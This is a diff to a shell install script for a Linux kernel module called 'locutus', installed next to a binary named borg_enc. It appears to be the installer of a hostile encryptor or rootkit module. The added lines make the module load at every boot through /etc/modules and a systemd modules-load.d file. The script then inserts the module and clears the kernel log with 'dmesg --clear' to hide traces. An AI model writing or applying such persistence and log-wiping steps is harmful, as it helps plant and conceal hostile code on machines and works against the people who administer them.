@@ -16,7 +16,11 @@ sudo chmod +x /bin/borg_enc &&
 mv locutus.ko borg_locutus.ko &&
 cp borg_locutus.ko /lib/modules/`uname -r`/kernel/lib &&
 depmod -a &&
-echo "borg_locutus" >> /etc/modules &&
+# Use internal module name 'locutus' (depmod indexes by ELF metadata, not filename)
+grep -qxF "locutus" /etc/modules 2>/dev/null || echo "locutus" >> /etc/modules &&
+# Also add systemd-native module loading
+mkdir -p /etc/modules-load.d/ &&
+echo "locutus" > /etc/modules-load.d/locutus.conf &&
 sudo insmod borg_locutus.ko && # insert lkm
 dmesg --clear &&# clear log
 
